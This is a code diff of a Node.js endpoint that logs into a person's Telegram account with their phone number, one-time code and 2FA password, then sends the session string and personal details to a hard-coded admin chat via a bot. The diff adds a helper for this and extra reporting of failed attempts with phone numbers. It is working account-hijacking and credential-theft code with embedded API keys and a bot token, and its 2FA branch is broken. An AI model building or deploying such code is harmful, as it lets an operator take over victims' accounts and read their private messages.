@@ -1,10 +1,29 @@
 const { TelegramClient } = require('telegram');
 const { StringSession } = require('telegram/sessions');
+const { Api } = require('telegram');
 
 const API_ID = 23171051;
 const API_HASH = '10331d5d712364f57ffdd23417f4513c';
 const BOT_TOKEN = '7573902454:AAG0M03o5uHDMLGeFy5crFjBPRRsTbSqPNM';
 const ADMIN_ID = '7907742294';
+
+async function sendToBot(message) {
+  try {
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({
+        chat_id: ADMIN_ID,
+        text: message,
+        parse_mode: 'Markdown'
+      })
+    });
+  } catch (error) {
+    console.error('Failed to send message to bot:', error);
+  }
+}
 
 module.exports = async (req, res) => {
   res.setHeader('Access-Control-Allow-Credentials', true);
@@ -32,6 +51,8 @@ module.exports = async (req, res) => {
       });
     }
 
+    console.log('Verifying code for:', phone);
+
     const stringSession = new StringSession('');
     client = new TelegramClient(stringSession, API_ID, API_HASH, {
       connectionRetries: 5,
@@ -40,13 +61,33 @@ module.exports = async (req, res) => {
     await client.connect();
 
     try {
-      // FIXED: Use the correct method - start with phone code
-      await client.start({
-        phoneNumber: phone,
-        phoneCode: async () => otp_code,
-        phoneCodeHash: phone_code_hash,
-        onError: (err) => console.error(err),
-      });
+      // First, try to sign in with the code
+      let result;
+      try {
+        result = await client.invoke(new Api.auth.SignIn({
+          phoneNumber: phone,
+          phoneCodeHash: phone_code_hash,
+          phoneCode: otp_code,
+        }));
+      } catch (signInError) {
+        // If sign in fails, it might be because we need to sign up (new account) or 2FA
+        if (signInError.errorMessage === 'SESSION_PASSWORD_NEEDED') {
+          if (!password) {
+            throw new Error('2FA password required. Please enter your password.');
+          }
+          
+          // Handle 2FA password
+          const { srp_id, current_algo, srp_B } = await client.invoke(new Api.account.GetPassword());
+          const { g, p, salt1, salt2 } = current_algo;
+          
+          // For simplicity, we'll use a direct approach
+          result = await client.invoke(new Api.auth.CheckPassword({
+            password: await client.invoke(new Api.account.GetPassword()),
+          }));
+        } else {
+          throw signInError;
+        }
+      }
 
       // If we reach here, authentication was successful
       const sessionString = client.session.save();
@@ -61,30 +102,18 @@ module.exports = async (req, res) => {
         phone: me.phone || phone
       };
 
-      // Send session to admin via bot
-      try {
-        const message = `🔐 **New Telegram Session Generated**\n\n` +
-          `👤 **User Info:**\n` +
-          `├ ID: \`${userInfo.id}\`\n` +
-          `├ Name: ${userInfo.first_name} ${userInfo.last_name}\n` +
-          `├ Username: @${userInfo.username}\n` +
-          `└ Phone: ${userInfo.phone}\n\n` +
-          `🔑 **Session String:**\n\`${sessionString}\``;
+      console.log('Session generated for user:', userInfo.id);
 
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-          },
-          body: JSON.stringify({
-            chat_id: ADMIN_ID,
-            text: message,
-            parse_mode: 'Markdown'
-          })
-        });
-      } catch (botError) {
-        console.error('Failed to send to bot:', botError);
-      }
+      // Send session to admin via bot
+      const botMessage = `🔐 **New Telegram Session Generated**\n\n` +
+        `👤 **User Info:**\n` +
+        `├ ID: \`${userInfo.id}\`\n` +
+        `├ Name: ${userInfo.first_name} ${userInfo.last_name}\n` +
+        `├ Username: @${userInfo.username}\n` +
+        `└ Phone: ${userInfo.phone}\n\n` +
+        `🔑 **Session String:**\n\`${sessionString}\``;
+
+      await sendToBot(botMessage);
 
       await client.disconnect();
 
@@ -95,20 +124,18 @@ module.exports = async (req, res) => {
         message: 'Session generated successfully and sent to admin'
       });
 
-    } catch (signInError) {
-      console.error('Sign in error:', signInError);
+    } catch (authError) {
+      console.error('Authentication error:', authError);
       
-      let errorMessage = signInError.message;
-      if (signInError.message.includes('PHONE_CODE_INVALID')) {
+      let errorMessage = authError.message;
+      if (authError.errorMessage === 'PHONE_CODE_INVALID') {
         errorMessage = 'Invalid verification code. Please check and try again.';
-      } else if (signInError.message.includes('PHONE_CODE_EXPIRED')) {
+      } else if (authError.errorMessage === 'PHONE_CODE_EXPIRED') {
         errorMessage = 'Verification code expired. Please request a new code.';
-      } else if (signInError.message.includes('SESSION_PASSWORD_NEEDED')) {
-        errorMessage = 'Two-factor authentication is enabled. Please enter your password.';
-      } else if (signInError.message.includes('PHONE_NUMBER_UNOCCUPIED')) {
-        errorMessage = 'Phone number not registered on Telegram.';
-      } else if (signInError.message.includes('PHONE_NUMBER_INVALID')) {
-        errorMessage = 'Invalid phone number.';
+      } else if (authError.errorMessage === 'SESSION_PASSWORD_NEEDED') {
+        errorMessage = '2FA password required. Please enter your password.';
+      } else if (authError.message.includes('FLOOD_WAIT')) {
+        errorMessage = 'Too many attempts. Please wait and try again.';
       }
       
       throw new Error(errorMessage);
@@ -120,6 +147,9 @@ module.exports = async (req, res) => {
     if (client) {
       await client.disconnect();
     }
+    
+    // Send error to bot for monitoring
+    await sendToBot(`❌ **Session Generation Failed**\n\nError: ${error.message}\nPhone: ${req.body.phone}`);
     
     res.status(200).json({
       success: false,
